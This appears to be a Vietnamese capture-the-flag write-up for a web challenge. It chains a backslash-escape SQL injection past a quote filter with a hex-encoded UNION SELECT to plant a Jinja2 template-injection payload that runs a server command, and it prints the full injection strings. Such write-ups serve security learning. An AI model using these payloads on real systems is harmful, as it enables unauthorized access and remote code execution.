# no quotes

## Challenge Information
- **Category**: Web Exploitation
- **Event**: Uoftctf 2026
- **URL**: [Link Challenge](https://play.picoctf.org/practice/challenge/349)
- **Author**: SteakEnthusiast
- **Tags**: #web #SQLi #HexEncode
---
## 1. Description
## 2. Overview
Bài này có một form đăng nhập, và challenge cung cấp source của trang đăng nhập này, khi khai thác sẽ phát hiện ra lỗ hổng SQLi và 1 hàm xử lý chuỗi đầu vào ngăn chặn `'` và `"` nhưng ta có thể bypass dễ dàng bằng kỹ thuật `hexa encode` và dùng `UNION` để lấy flag.
## 3. Reconnaissance
Hệ thống sử dụng một hàm `waf()` đơn giản để chặn SQL Injection:

```python
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)
```

**Nhận xét:** WAF này cực kỳ yếu. Nó chỉ chặn dấu nháy đơn và nháy kép, bỏ ngỏ hoàn toàn dấu gạch chéo ngược (`\`) và các từ khóa SQL, tạo tiền đề cho kỹ thuật Backslash Injection và Hex Encoding.

Lỗi kinh điển khi ghép chuỗi trực tiếp vào câu query:

```python
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

**Nhận xét:** Dù WAF chặn dấu `'`, ta có thể truyền `\` vào trường `username`. Dấu `\` sẽ giúp đóng dấu nháy, khiến database hiểu toàn bộ đoạn `') AND password = (` là một phần của chuỗi username. Từ đó, trường `password` sẽ trở thành điểm để ta tiêm mã SQL tùy ý.

Trang home render giao diện người dùng dựa trên session:

```python
return render_template_string(open("templates/home.html").read() % session["user"])
```

**Nhận xét:** Dòng code này sử dụng toán tử `%` để nối biến `session["user"]` vào chuỗi HTML **trước khi** đưa vào engine Jinja2 (`render_template_string`). Nếu ta có thể kiểm soát được `session["user"]` thành một cú pháp Jinja2 (ví dụ `{{ ... }}`), ta sẽ có được RCE. Ta sẽ thử với payload `{{7 * 7}}`:

![](images/Pasted%20image%2020260301105116.png)

-> Ta sẽ dùng biện pháp mạnh hơn đó là dùng `UNION`, payload sẽ là: `) UNION SELECT 1, {{7 * 7}} #`

![](images/Pasted%20image%2020260301105332.png)

Vẫn chưa được, vì server dùng mySQL, ta sẽ thử hexcode xem sao, payload: `) UNION SELECT 1, 0x7b7b372a377d7d #`

![](images/Pasted%20image%2020260301105543.png)

-> Đăng nhập thành công và hiện `49` -> SSTI + SQLi 99%
## 4. Exploitation
Từ các dữ kiện ở phần Recon, ta có thể xây dựng chuỗi khai thác như sau: **Dùng SQLi để giả mạo một user có tên chính là payload SSTI -> Đăng nhập thành công -> Kích hoạt SSTI tại trang Home để đọc flag.**

Để đọc file flag trên server, ta dùng Python nhúng trong Jinja2:

```python
{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}
```

Vì form login không cho phép nhập dấu `'` hoặc `"`, ta không thể dùng chuỗi văn bản thông thường trong câu lệnh SQL. Thay vào đó, ta chuyển toàn bộ payload SSTI ở trên sang định dạng Hex (thập lục phân).

 Payload dạng Hex: `7b7b636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b276f73275d2e706f70656e28272f72656164666c616727292e7265616428297d7d`

Trong MySQL, chỉ cần thêm `0x` vào trước mã Hex, database sẽ tự hiểu đó là một chuỗi hợp lệ mà không cần dấu nháy.

Tại form đăng nhập, ta inject:
**Username:** `\`
**Password:** `) UNION SELECT 1, 0x7b7b636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b276f73275d2e706f70656e28272f72656164666c616727292e7265616428297d7d #`

-> lấy được flag

![](images/Pasted%20image%2020260301104950.png)